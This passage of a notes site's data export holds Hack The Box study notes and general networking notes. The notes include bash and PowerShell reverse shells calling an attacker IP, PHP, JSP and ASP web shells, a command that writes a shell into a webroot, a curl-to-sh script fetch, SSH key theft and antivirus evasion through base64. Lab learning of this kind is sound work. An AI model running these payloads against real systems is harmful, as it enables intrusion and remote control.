file/dir\n"},"HTB/Gobuster":{"title":"Gobuster","links":["tags/web","tags/Reconnaissance","HTB/http-response-code","HTB/Wordlists","HTB/Seclist"],"tags":["web","Reconnaissance"],"content":"tags: web Reconnaissance\nGobuster is a web enumeration tool.\nDirectory/File Enumeration\nWe can use dir flag for directory enumeration.\nSyntax\n\tgobuster dir -u &lt;url&gt; -w &lt;wordlist&gt;\nIt returns various http response code for each directory which was found and can be accessed manually.\nWe can use various Wordlists for this attack such as /usr/share/wordlists/dirb/common.txt.\nDNS Subdomain Enumeration\nWe can use dns flag for subdomain enumeration. For wordlist we can use Seclist which has lists for subdomains."},"HTB/JavaScript-Deobfuscation":{"title":"JavaScript Deobfuscation","links":["tags/web"],"tags":["web"],"content":"web\nThe js files are minified into .min.js to hide the functions and data. To return them to their original form we have to use a deobsfuscator.\nWe can use Online Deobsfuscator such as de4js to decode the files.\nAfter deobfuscation we can see how functions are implemented, call them using console and so on."},"HTB/Logging-of-Commands":{"title":"Logging of Commands","links":[],"tags":[],"content":"To display date and time in the terminal we can change the PS1 variable in .bashrc file as follows.\n\nBackup first\n\ncp .bashrc .bashrc.bak\n\nModify the bash\n\necho &#039;export PS1=&quot;-[\\[$(tput sgr0)\\]\\[\\033[38;5;10m\\]\\d\\[$(tput sgr0)\\]-\\[$(tput sgr0)\\]\\[\\033[38;5;10m\\]\\t\\[$(tput sgr0)\\]]-[\\[$(tput sgr0)\\]\\[\\033[38;5;214m\\]\\u\\[$(tput sgr0)\\]@\\[$(tput sgr0)\\]\\[\\033[38;5;196m\\]\\h\\[$(tput sgr0)\\]]-\\n-[\\[$(tput sgr0)\\]\\[\\033[38;5;33m\\]\\w\\[$(tput sgr0)\\]]\\\\$ \\[$(tput sgr0)\\]&quot;&#039; &gt;&gt; .bashrc\nScript - For Linux\nTo start logging terminal session in a file.\nscript &lt;date&gt;-&lt;start_time&gt;-&lt;name&gt;.log\nStart-Transcript - For windows\nStart-Transcript -Path &quot;C:\\Pentesting\\03-21-2021-0200pm-exploitation.log&quot;"},"HTB/Metasploit":{"title":"Metasploit","links":["HTB/Searchsploit"],"tags":[],"content":"Metasploit Framework (MSF) is a tool which contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets.\nTo use metasploit we need to learn the name of exploit that can be used against the service. this can be done using tools like Searchsploit.\nCommands\n1. msfconsole:\nTo start metasploit\nmsfconsole\n2. search exploit\nsearch exploit &lt;exploit&gt;\ne.g. when we search for exploit eternalblue we get output exploit/windows/smb/ms17_010_psexec along with other details.\n3. use exploit\nuse &lt;full name of exploit&gt;\ne.g. use exploit/windows/smb/ms17_010_psexec\n4. show options\nTo show config items before using an exploit. The items having required value set to zero must be set before running exploit.\n5. set &lt;option&gt;\nTo set value of a option.\nExample:\nset RHOSTS 1.1.1.1\n6. check\nTo check if exploit works without actually compromising the system."},"HTB/Nmap":{"title":"Nmap","links":["tags/Reconnaissance","locate"],"tags":["Reconnaissance"],"content":"Reconnaissance\nParameters\n\n-sC: Run default scripts and obtain more detailed info\n-sV: Version scan\n-p-: Scan all ports\n-T:\n\n-T1: Slowest\n-T5: Physcho\n\n\n-Pn: Ping probe\n-oA: Output all to file\n \n\n\nnmap -oA outputfile 1.1.1.1\n```\nUsage\nnmap -sC -sV 1.1.1.1\nScripts\nThe syntax for running an Nmap script is `nmap —script  -p&lt;port&gt; &lt;host&gt;‘.\n1. We can locate scripts using locate:\nlocate scripts/citrix\n2. Then to run the script:\nnmap --script=&quot;my_script&quot; -p 224 1.1.1.1"},"HTB/Privilege-Escalation":{"title":"Privilege Escalation","links":["reverse-shell","SSH"],"tags":[],"content":"1. Enumeration Scripts\n\nPEAS\n\nLinPEAS\n\n \n\n\ncurl -L github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\t- WinPEAS\n\n# 2. SUDO\nThe `sudo` command can be used to run command to escalate privilege. We can check what `sudo` privilege we have using `sudo -l`. Most commands require user `password` but some can be ran as root without entering user password. These applications have `NOPASSWD` entry.\n```shell\n$ sudo -l\n\n    (user : user) NOPASSWD: /bin/echo\n\nWe can run that command using the shown user without entering password:\n$ sudo -u user /bin/echo Hello World!\n \n    Hello World!\nThis process can be automated using tools such as GTFObins for Linux and LOLBAS for windows.\n3. Scheduled Tasks\nThere are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:\n\nAdd new scheduled tasks/cron jobs\nTrick them to execute a malicious software\n\nThere are specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them. These include:\n\n/etc/crontab\n/etc/cron.d\n/var/spool/cron/crontabs/root\n\nIf we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.\n4. Exposed Credentials\nWe can also find user passwords exposed in configuration files, logs and history files (bash_history) if we have read access to them.\n5. SSH Keys\nIf we have access to .ssh directory, we can read private keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa,  we can copy it to our machine and use the -i flag to log in with it:\nvim id_rsa\nchmod 600 id_rsa\nssh root@10.10.10.10 -i id_rsa\nCommands for specific applicaton\nPHP\nSummon bash\nsudo php -r &#039;system(&quot;/bin/bash&quot;);&#039;"},"HTB/Remote-Shells":{"title":"Remote Shells","links":["HTB/Reverse-Shell","HTB/Bind-Shell","HTB/Web-Shell"],"tags":[],"content":"Types of Remote Shell\n1. Reverse Shell\nConnects back to our system and gives us control through a reverse connection.\n2. Bind Shell\nWaits for us to connect to it and gives us control once we do.\n3. Web Shell\nCommunicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output."},"HTB/Reverse-Shell":{"title":"Reverse Shell","links":["Netcat"],"tags":[],"content":"Netcat Listener\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFlagDescription-lListen mode, to wait for a connection to connect to us.-vVerbose mode, so that we know when we receive a connection.-nDisable DNS resolution and only connect from/to IPs, to speed up the connection.-p 1234Port number netcat is listening on, and the reverse connection should be sent to.\nUsage\nnc -nvlp &lt;port&gt;\nReverse Shell Commands\nFor bash\nbash -c &#039;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#039;\nFor bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f\nFor Powershell\npowershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#039;10.10.10.10&#039;,1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2 = $sb + &#039;PS &#039; + (pwd).Path + &#039;&gt; &#039;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()&quot;"},"HTB/SID":{"title":"SID","links":["tags/windows","HTB/Security-Group"],"tags":["windows"],"content":"tags: windows\nSID is a unique identifier of a user which is assigned when a user logs in and has all permissions assigned to it.\ne.g. S-1-5-21-2614195641-1726409526-3792725429-1006\nFinding SID\nCurrent user\nSID of current user can be found using the whoami command.\nwhoami /user\nOther users\nBut for user not logged in, we need to user Get-WmiObject Command.\n Get-WmiObject -Class Win32_UserAccount -filter &quot;name=&#039;Jim&#039;&quot;\nOR\n(Get-Localuser username).SID\nFor Security Group\nGet-WMIObject win32_group -filter &quot;name=&#039;NameOfGroup&#039;&quot;\nOR\n(Get-Localgroup $GroupName).SID"},"HTB/SMB":{"title":"SMB","links":["tags/windows","tags/file-transfer","HTB/Nmap","HTB/Smbclient"],"tags":["windows","file-transfer"],"content":"windows file-transfer\nServer Message Block (SMB)\nEnumerating SMB\nNmap has many scripts for enumerating smb such as smb-os-discovery.nse\nnmap --script smb-os-discovery.nse 1.1.1.1\nShares\nSo smb allows users to share folders (hence called shares) which can be accessed and enumerated using Smbclient in linux."},"HTB/Searchsploit":{"title":"Searchsploit","links":["HTB/Metasploit"],"tags":[],"content":"Searchsploit is a tool used to search for public vulnerabilities against a service which can then be used in Metasploit to attack the target\nInstallation\nsudo apt install exploitdb -y\nUsage\nsearchsploit &lt;application&gt; &lt;version&gt;\nExample\nsearchsploit openssh 7.2"},"HTB/Seclist":{"title":"Seclist","links":["HTB/Wordlists"],"tags":[],"content":"Seclist is a Wordlists repository.\nInstallation\n1. Using Git\ngit clone github.com/danielmiessler/SecLists\n2. Using apt\nsudo apt install seclists -y"},"HTB/Security-Group":{"title":"Security Group","links":["tags/windows"],"tags":["windows"],"content":"tags: windows\nIn Windows, groups can be defined to better manage permissions of users\nCreating a security group\nNew-LocalGroup -Name &quot;Group1&quot; -Description &quot;The new group&quot;\nAdd users to the group\nAdd-LocalGroupMember -Name Group1 -Member Jim"},"HTB/Services":{"title":"Services","links":["tags/windows"],"tags":["windows"],"content":"tags: windows\nWindows services are programs that run in the background.\nTo list services\nGet-Service | Where-Object {$_.Status -eq &quot;Running&quot;}\nOutput to a csv file\nGet-Service | Out-File -FilePath &quot;Services.txt&quot;"},"HTB/Smbclient":{"title":"Smbclient","links":["HTB/SMB","tags/file-transfer"],"tags":["file-transfer"],"content":"References: SMB\nTags: file-transfer\nsmbclient is a tool to enumerate and interact with smb shares.\nFlags\n\n-N : suppress password prompt\n-L : list available shares\n\nCommand\nsmbclient -N -L \\\\\\\\1.1.1.1\nConnecting to a share\n1. Connect as a guest\nsmbclient \\\\\\\\1.1.1.1\\\\users\n2. Connect as a specific user\nsmbclient -U Bob \\\\\\\\1.1.1.1\\\\users\nCommands\n\nGet: To download files to our local system\nExit: To exit ftp session.\nls: To list dir\n"},"HTB/Transferring-Files":{"title":"Transferring Files","links":["tags/file-transfer","cURL"],"tags":["file-transfer"],"content":"file-transfer\n1. Using wget or cURL\nFirst we have to start a python server on directory containing the file we need to upload\npython3 -m http.server 8000\nThen we can use wget or curl to download the file from victim system\nwget http://&lt;our_ip&gt;:8000/&lt;file_name&gt;\ncurl http://&lt;our_ip&gt;:8000/&lt;file_name&gt; -o &lt;output_file_name&gt;\n2. Using scp\nIf we have obtained ssh user credentials on the remote host. We can do so as follows:\nscp &lt;our_filename&gt; user@remotehost:/dir/&lt;out_filename&gt;\n3. Using Base64\nTo bypass firewall and av we can encode our file before sending and decode on victim system.\nFor example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:\nbase64 shell -w 0\nNow, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:\necho &lt;encoded_string&gt; | base64 -d &gt; shell"},"HTB/User-Creation":{"title":"User Creation","links":["tags/windows","HTB/Security-Group"],"tags":["windows"],"content":"tags: windows\nCreate a new user\nNew-LocalUser -Name &#039;Bob&#039; -NoPassword\nAssign user to a Security Group\nAdd-LocalGroupMember -Name Group1 -Member Bob"},"HTB/Web-Shell":{"title":"Web Shell","links":["HTB/Webroot","cURL"],"tags":[],"content":"A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.\nWriting a Web Shell\nWe need to write our web shell that would take our command through a GET request, execute it, and print its output back.\nSome common web shells:\nFor php\n&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;\nFor jsp\n&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); %&gt;\nFor asp\n&lt;% eval request(&quot;cmd&quot;) %&gt;\nUploading a web shell\nWe need to have our web shell in the remote server’s Webroot to execute it. We can either upload our shell such as shell.php to the server using file upload vulnerability or directly write our shell using command execution vulnerability\nWriting a web shell\nFor apache Webroot\necho &#039;&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;&#039; &gt; /var/www/html/shell.php\nAccessing Web shell\n1. Visiting the webpage\nTo run a command we can visit our shell.php page and use ?cmd=id to execute id command.\nExample url: http://SERVER_IP:PORT/shell.php\n2. Using cURL\ncurl http://SERVER_IP:PORT/shell.php\nGreatness of Web Shell\n\nIt can bypass any firewall (uploading shell might trigger tho) as we are using existing port to run command using existing service to summon a shell.\nEven if host is rebooted the shell is intact.\n\nSadness of Web Shell\n\nIts easy to detect as any sane person/antivirus can notice a shell.php in root directory.\nIts is not interactive as we need to send requests for command each time tho we can automate and make it semi automatic but its not as good.\n"},"HTB/Webroot":{"title":"Webroot","links":[],"tags":[],"content":"The following are the default webroots for common web servers:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nWeb ServerDefault WebrootApache/var/www/html/Nginx/usr/local/nginx/html/IISc:\\inetpub\\wwwroot\\XAMPPC:\\xampp\\htdocs\\"},"HTB/Wordlists":{"title":"Wordlists","links":["HTB/Seclist"],"tags":[],"content":"Default Wordlist\nDirectory: /usr/share/wordlist\nTree\nExternal List\n1. Seclist"},"HTB/http-response-code":{"title":"http response code","links":[],"tags":[],"content":"1. 200 – Successful\n\nMeaning: The request was successful, and the server returned the requested resource.\nCommon Use Cases:\n\nSuccessful loading of a web page.\nAPI request returning valid data.\n\n\n\n\n2. 301 – Redirect\n\nMeaning: The requested resource has been permanently moved to a new URL.\nCommon Use Cases:\n\nUsed in SEO to redirect old URLs to new ones.\nEnsures users and search engines access the correct location.\n\n\n\n\n3. 403 – Forbidden\n\nMeaning: The server understood the request but refuses to authorize it.\nCommon Use Cases:\n\nUser tries to access a restricted file or directory.\nMissing permissions or access credentials.\n\n\n\n\n4. 404 – Not Found\n\nMeaning: The requested resource could not be found on the server.\nCommon Use Cases:\n\nBroken links or deleted resources.\nMistyped URLs.\n\n\n\n\n5. 500 – Internal Server Error\n\nMeaning: The server encountered an error and could not complete the request.\nCommon Use Cases:\n\nServer misconfiguration or malfunction.\nBug in server-side code.\n\n\n\n\n6. 302 – Found (Temporary Redirect)\n\nMeaning: The requested resource is temporarily located at a different URL.\nCommon Use Cases:\n\nRedirecting users to a different page temporarily during maintenance.\n\n\n\n\n7. 400 – Bad Request\n\nMeaning: The server could not understand the request due to invalid syntax.\nCommon Use Cases:\n\nAPI call with incorrect parameters or malformed JSON.\n\n\n\n\n8. 401 – Unauthorized\n\nMeaning: The request requires user authentication.\nCommon Use Cases:\n\nAccessing pages or APIs requiring login credentials.\n\n\n\n\n9. 502 – Bad Gateway\n\nMeaning: The server, acting as a gateway or proxy, received an invalid response from an upstream server.\nCommon Use Cases:\n\nServer overload or upstream server issues.\n\n\n\n\n10. 503 – Service Unavailable\n\nMeaning: The server is temporarily unable to handle the request.\nCommon Use Cases:\n\nServer maintenance or high traffic.\n\n\n"},"HTB/ssh":{"title":"ssh","links":[],"tags":[],"content":"Secure shell"},"Networking/ARP":{"title":"ARP","links":["Networking/Mac-Address","Networking/IP-Address","Networking/Port"],"tags":[],"content":"Address Resolution Protocol (ARP) is used to get Mac Address of a host from using its IP Address.\nHow ARP Works\nWhen a host needs to find Mac Address of destination device in same network, following steps are followed by the host.\n1. ARP REQUEST\nAn Ethernet Broadcast is sent by the host with the IP Address of destination device.\nNote:\n\nRouters do not forward broadcasts.\nEthernet broadcast are frames with their destination address FF:FF:FF:FF:FF:FF or FFFF.FFFF.FFFF.\nSwitches flood broadcasts to all ports except the incoming Port.\n\n2. ARP REPLY\nThe host with the matching IP Address sends its Mac Address back to the original sending host.\n3. ARP Table\nWhen the sending host receives the message, it stores the Mac Address and IP Address information in a table called an ARP table."},"Networking/Bandwidth-vs-Throughput":{"title":"Bandwidth vs Throughput","links":[],"tags":[],"content":"Bandwidth\nIt is the total capacity of a network to transfer data over an interval of time. It is measured in kbps, mbps, gbps.\nThroughput\nIt is also the capacity of network to transfer data but also considers latency and other factors.\nIt means bandwidth is how much it can transfer and throughput is how much it is able to transfer with a time interval due to factors such as latency and data loss."},"Networking/DHCP":{"title":"DHCP","links":["IP-address","Networking/IP-Address","Networking/IPV4-Address","Networking/Gateway","Networking/Mac-Address"],"tags":[],"content":"Dynamic Host Configuration Protocol (DHCP) is a protocol to dynamically assign IP address to a host is generally the preferred method of assigning IPv4 addresses to hosts on large networks because it reduces the burden on network support staff and virtually eliminates entry errors.\nHow DHCP works?\n1. DHCP Discover\nNew clients send DHCP broadcast when they join the network.\n2. DHCP Offer\nThe broadcast is then received by the DHCP Server and an DHCP offer is sent back to client which contains\n\nIP Address\nSubnet Mask\nDefault Gateway address\n\n3. DHCP Request\nThe client then again sends a DHCP request packet that it will accept the address.\n4. DHCP Acknowledgement\nThe server finally sends back a DHCP packet stating that the IP address assignment has been  associated with the Mac Address of the host in its table.\nDHCP Server\nDHCP Servers can be any system running DHCP service.\nWith most medium to large networks, the DHCP server is usually a local dedicated PC-based server.\nBut for home networks, the router acts as both DHCP client and a server. The router receives the public IP Address from the ISP as DHCP client, and in its role as a DHCP server, it distributes private addresses to internal hosts."},"Networking/DNS":{"title":"DNS","links":[],"tags":[],"content":"abbr. Domain Name System\nManual Lookup\n&gt; nslookup google.com\nServer:  dns.google\nAddress:  8.8.8.8\n \nNon-authoritative answer:\nName:    google.com\nAddresses:  2404:6800:4002:826::200e\n          142.250.195.14"},"Networking/Ethernet-Protocol":{"title":"Ethernet Protocol","links":["Networking/OSI-Model","Networking/Mac-Address","Networking/Port"],"tags":[],"content":"Ethernet Frame\nEthernet frame are a part of Data Link Layer of OSI Model. Data to be transported between one NIC to other NIC in the same network is transported through the Ethernet Protocol.\nAn Ethernet Frame looks like:\n\nwhere,\n\nPreamble: It syncs the receiver NIC with the sender NIC bit by bit.\nSFD (abbr. Start Frame Delimiter): Indicates the start of actual of information related to ethernet frame.\nCRC (Frame Check Sequence): It makes sure that there was no error in received frame.\n\nEthernet Switch/ Layer 2 Switch\nEthernet switch is a device which connects multiple NICs together and is responsible to route ethernet frames from source NIC to destination NIC based on Layer 2 address. It checks for the receiving Mac Address in its Mac Address Table and forwards the frame to the Port linked with the Mac Address.\nWhen an ethernet switch receives an ethernet frame:\n\nIts checks if the source address is in the Mac Address table and if its not there adds it.\nThen checks if the destination address is there and\n\nIf founds forwards the frame to the respective Port.\nIf not found forwards the frame to all ports except the source Port.\nWhen the destination source sends frame back as source, the switch adds the address it its table then.\n\n\n"},"Networking/Gateway":{"title":"Gateway","links":["Networking/DHCP","Networking/Gateway","IP-address"],"tags":[],"content":"Gateways are the “Door” in and out of a network. In home networks, the router acts as both the DHCP Server and Gateway. Default gateway address is set when configuring the IP settings either statically or dynamically using DHCP\nFor example,\nLets say we are in a network and our IP address is 192.168.5.12 and our gateway is 192.168.5.1 (the router). Similarly, in the same physical network but on different logical network is other device 192.168.6.12, then its gateway might be 192.168.6.10, even though both of them are addressing the same router; they need different Gateway addresses because they are in different logical networks."},"Networking/IP-Address":{"title":"IP Address","links":["Networking/IPV4-Address","Networking/IPV6-Address"],"tags":[],"content":"IP Address is logical address of a computer in a computer network. IP address are used to facilitate Network Layer/Layer3 communication.\nCurrently there exist two types of IP Addresses\n\nIPV4 Address: 192.168.1.1\nIPV6 Address: fe80::7c6:ec37:1b55:6600\n\nFollowing commands can be used to view IP address of host\n\nipconfig\n"},"Networking/IPV4-Address":{"title":"IPV4 Address","links":["Networking/IPV4-Address","HTB/Services","Networking/NAT","Networking/Gateway","Networking/DHCP"],"tags":[],"content":"An IPV4 Address is used to identify each device in a network. It is a logical address of a device on a network.\n\nSubnet Mask\nThe subnet mask is used to identify the network on which the host is connected.\ne.g.,\na host with a subnet mask of 255.255.255.0 has its network address as first three octets.\nThe subnet mask for 255.255.255.0 can also be represented using slash notion or /24. This indicates that the subnet mask is 24 bits long.\n\nAddress Structure\nAn ipv4 address is 32 bits in length, and the 32 bits are grouped into four 8-bit bytes called octets like this:\n11010001.10100101.11001000.00000001\nFor ease in reading they are then converted into decimal format which we see,\n201.165.200.1\nAn ipv4 address can be divided into two portions:\n1. Network Portion\nIt is used to identify the network address of a host.\ne.g.,\na host with an IPv4 address 192.168.5.11 with a subnet mask of 255.255.255.0 has a network address as 192.168.5.0.\nTwo different hosts on different networks can’t communicate with each other, e.g., 192.168.1.5 and 192.168.2.5 can’t communicate directly and need a router to facilitate the connection.\n2. Host Portion\nIt is used to identify a host in a network.\ne.g.,\na host with an IPv4 address 192.168.5.11 with a subnet mask of 255.255.255.0 has the host address as 11.\n\nData Transmission\n1. Unicast\nUnicast transmission refers to one device sending a message to one other device in one-to-one communications.\nNote: A source IP address can only be a unicast address, because the packet can only originate from a single source. This is regardless of whether the destination IP address is a unicast, broadcast, or multicast.\n2. Broadcast\nBroadcast transmission refers to a device sending a message to all the devices on a network in one-to-all communications. By default, routers do not forward broadcasts to other networks.\nA broadcast packet has a destination IP address with all 32 one (1) bits.\nNote:\n\nIPv4 uses broadcast packets. However, there are no broadcast packets with IPv6.\nA router will not forward a broadcast, but a switch.\n\n3. Multicast\nMulticast transmission reduces traffic by allowing a host to send a single packet to a selected set of hosts that subscribe to a multicast group.\nA multicast packet is a packet with a destination IP address that is a multicast address. IPv4 has reserved the 224.0.0.0 to 239.255.255.255 addresses as a multicast range.\nThe multicast clients use Services requested by a client program to subscribe to the multicast group. Each multicast group is represented by a single IPv4 multicast destination address. When an IPv4 host subscribes to a multicast group, the host processes packets addressed to this multicast address, and packets addressed to its uniquely allocated unicast address.\n\nPrivate and Public IP Addresses\nPrivate IP Address\nPrivate IP address are used for communication within a network and can’t be used to communicate with internet.\nPrivate IP Address have the following network addresses:\n\n10.0.0.0/8\n172.16.0.0/12\n192.168.0.0/16\n\nPublic IP Address\nPublic IP address is used to communicate on the internet and is unique worldwide.\nNote: When we connect to internet, we must convert our private address to public, and this is done by home router using Network Address Translation (NAT).\n\nLoopback addresses\nLoopback addresses (127.0.0.0 /8 or 127.0.0.1 to 127.255.255.254) are more commonly identified as only 127.0.0.1. These are special addresses used by a host to direct traffic to itself.\n\nLegacy Classful Addressing\nIn early days with a limited number of computers using the internet, classful addressing was an effective means to allocate addresses. Classful address allocation was later replaced with classless addressing, which is used today. Classless addressing ignores the rules of classes (A, B, C).\nClass A\n\n(0.0.0.0/8 to 127.0.0.0/8)\nSupports extremely large networks with more than 16 million host addresses per network. Class A used a fixed /8 prefix with the first octet to indicate the network address and the remaining three octets for host addresses.\n\nClass B\n\n(128.0.0.0 /16to 191.255.0.0 /16)\nSupports moderate to large size networks with up to approximately 65,000 hosts per network. Class B used a fixed /16 prefix with the two high-order octets to indicate the network address and the remaining two octets for host addresses.\n\nClass C\n\n(192.0.0.0 /24 to 223.255.255.0 /24)\nSupport small networks with a maximum of 254 hosts per network. Class C used a fixed /24 prefix with the first three octets to indicate the network and the remaining octet for the host addresses.\n\n\nIP Assignment Techniques\n1. Static Assignment\nWith a static assignment, the network administrator must manually configure the network information for a host. At a minimum, this includes the following:\n\nIP address: This identifies the host on the network.\nSubnet Mask: This is used to identify the network on which the host is connected.\nDefault Gateway: This identifies the networking device that the host uses to access the internet or another remote network.\n\n2. Dynamic Assignment\nRather than have the network administrator assign IPv4 addresses for each workstation, it is easier to have IPv4 addresses assigned automatically. This is done using a protocol known as Dynamic Host Configuration Protocol (DHCP).\nThe benefit of DHCP is that an address is not permanently assigned to a host but is only leased for a period of time. If the host is powered down or taken off the network, the address is returned to the pool for reuse."},"Networking/IPV6-Address":{"title":"IPV6 Address","links":["Networking/IPV6-Address","Networking/IPV4-Address","Networking/NAT"],"tags":[],"content":"IPV6 Address was introduce to overcome the limitations of IPV4 Address.\nIPv6 addresses are 128 bits in length and written as a string of hexadecimal values. Every four bits are represented by a single hexadecimal digit; for a total of 32 hexadecimal values, divided into 8 parts with colon (:) every 4 digits.\ne.g., 2001 : 0db8 : 0000 : 00a3 : abcd : 0000 : 0000: 1234\nFormatting Rules\n1. Omit leading Zero\nPreferred Format: 2001 : 0db8 : 0000 : 00a3 : abcd : 0000 : 0000: 1234\nNo leading 0s: 2001 : db8 : 0 : a3 : abcd : 0 : 0 : 1234\n2. Double Colon\nContiguous segments of zeros can be represented by double colon (… : abcd : : efgh : …)\ne.g.,\n2001 : db8 : 0 : a3 : abcd : 0 : 0 : 1234 can be written as,\n2001 : db8 : 0 : a3 : abcd :: 1234\nNote: Double colon can only be used only once and its best practice it use it on the longest segments of zero.\nIPV6 Address &amp; IPV4 Address Coexistance\n1. Dual Stack\nBoth ipv4 and ipv6 coexist in this technology and is adopted mostly.\n2. Tunneling\nTunneling is a method of transporting an IPv6 packet over an IPv4 network. The IPv6 packet is encapsulated inside an IPv4 packet, similar to other types of data.\n3. Translation\nNetwork Address Translation 64 (NAT64) allows IPv6-enabled devices to communicate with IPv4-enabled devices using a translation technique similar to NAT for IPv4. An IPv6 packet is translated to an IPv4 packet and an IPv4 packet is translated to an IPv6 packet."},"Networking/Mac-Address":{"title":"Mac Address","links":["Networking/Ethernet-Protocol","Networking/IPV4-Address","Networking/ARP","ICMPv6-Neighbor-Discovery"],"tags":[],"content":"A MAC (Media Access Control) address is a unique identifier assigned to a network interface card (NIC) for use in communications within a network segment.\nMac address works at a lower level: Layer 2: Data Link (i.e. Ethernet Mac Address), than the IP Address which works at Layer 3: Network, hence it offers direct communication between NIC to NIC.\nWhen a Layer 3 IP packet is sent from a host, it is encapsulated within Layer 2 Ethernet Frame by NIC which is de-encapsulated by destination NIC. When a packet is sent outside the network:\n\nThe host sends Ethernet Frame with router’s mac address as destination\nThe router de-encapsulates the packet and finds optimal path to destination.\nThe IP packet is re-encapsulated with the next destination mac address\nThis process is continued for each network hop.\n\nHow are IP address associated with Mac address\nFor IPv4 packets, this is done through a process called Address Resolution Protocol (ARP). For IPv6 packets, the process is ICMPv6 Neighbor Discovery (ND)."},"Networking/NAT":{"title":"NAT","links":["Networking/IP-Address","Networking/NAT","Networking/IPV4-Address","Networking/DHCP"],"tags":[],"content":"NAT abbr. Network Address Translation is the process of translating a private IP Address into public IP Address and vice versa. It is done by the router when a user tries to send a packet to a host not in the network.\nThe router keeps a table of Private IP Addresses and their Public IP Addresses, and when a packet destined to Internet is sent by a host, the router uses NAT to convert it to public address by modifying the packet and forwards to the internet.\nSimilarly, when a packet reaches the router with public IP Address the router replaces the public address with private address using its table.\nIf an associated public IP Address is present in the table, the router uses DHCP to get a public IPV4 Address for the host and then adds it to table and replaces IP and finally forwards it to the Internet."},"Networking/OSI-Model":{"title":"OSI Model","links":["Networking/OSI-Model","Networking/TCP-IP-Model","Networking/TCP-IP-vs-OSI-Model"],"tags":[],"content":"Abbr: Open Systems Interconnection\n\nIt has 7 layers:\n\nPhysical Layer\nDescribes the mechanical/electrical and other means to activate, maintain and deactivate physical connection to the network.\nData Link Layer\nProvides methods for exchanging data between devices in a common media\nNetwork Layer\nServices to actually exchange data between the devices.\nIP addressing occurs at this layer.\nTransport Layer\nServices to segment, transfer, and reassemble data for individual communication between devices.\nSession Layer\nProvides services for presentation layer to manage data exchange.\nPresentation Layer\nProvides representation for data transferred between Application layer.\nApplication Layer\nControls protocol for communication between the application.\n\nOSI Model and TCP IP Model both are models to transfer data in a network but have some differences. These differences are presented in TCP IP vs OSI Model."},"Networking/Port":{"title":"Port","links":["Networking/TCP","HTB/FTP","HTB/ssh","Networking/UDP","Networking/DHCP"],"tags":[],"content":"A port is a numeric identifier within each segment that is used to keep track of specific conversations between a client and server. Ports are assigned and managed by an organization known as the Internet Corporation for Assigned Names and Numbers (ICANN). Ports are broken into three categories and range in number from 1 to 65,535:\nTypes of Ports\n1. Well-known ports\nDestination ports that are associated with common network applications are identified as well-known ports. These ports are in the range of 1 to 1023.\n2. Registered ports\nPorts 1024 through 49151 can be used as either source or destination ports. These can be used by organizations to register specific applications such as IM applications.\n3. Reserved ports\nPorts 49152 through 65535 are often used as source ports. These ports can be used by any application.\nVisual Representation\n\nSome Common Ports\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPort NumberTransportApplication Protocol20TCPFile Transfer Protocol (FTP) - Data21TCPFTP - Control22TCPSecure Shell (ssh)23TCPTelnet25TCPSimple Mail Transfer Protocol (SMTP)53UDP, TCPDomain Name Service (DNS)67UDPDynamic Host Configuration Protocol (DHCP) - Server68UDPDHCP - Client69UDPTrivial File Transfer Protocol (TFTP)80TCPHypertext Transfer Protocol (HTTP)110TCPPost Office Protocol version 3 (POP3)143TCPInternet Message Access Protocol (IMAP)161UDPSimple Network Management Protocol (SNMP)443TCPHypertext Transfer Protocol Secure (HTTPS)"},"Networking/Socket":{"title":"Socket","links":["Networking/Port"],"tags":[],"content":"The combination of the source IP address and source Port number, or the destination IP address and destination Port number is known as a socket.\nSockets enable multiple processes, running on a client, to distinguish themselves from each other, and multiple connections to a server process to be distinguished from each other."},"Networking/TCP-IP-Model":{"title":"TCP IP Model","links":["Networking/TCP","Networking/TCP-IP-Model","Networking/OSI-Model","Networking/TCP-IP-vs-OSI-Model"],"tags":[],"content":"TCP/IP protocol is responsible for guaranteeing reliable delivery of a packet.\n\nTCP/IP protocol has 4 layers:\n\nApplication Layer\nRepresents data to the user, encoding and dialog control\nTransport Layer\nSupports communication between various devices across network\nInternet Layer\nDetermines best path through the network\nNetwork Access Layer\nControls the devices and media that make up the network\n\nThe difference between TCP IP Model and OSI Model are given in TCP IP vs OSI Model."},"Networking/TCP-IP-vs-OSI-Model":{"title":"TCP IP vs OSI Model","links":[],"tags":[],"content":"While TCP/IP and OSI both are meant to standardize communication in a network, they have some key similarities and differences.\n\nTCP/IP model does not describe general functions that are necessary for all networking communications. It describes the networking functions specific to those protocols in use in the TCP/IP protocol suite\nThe protocols that make up the 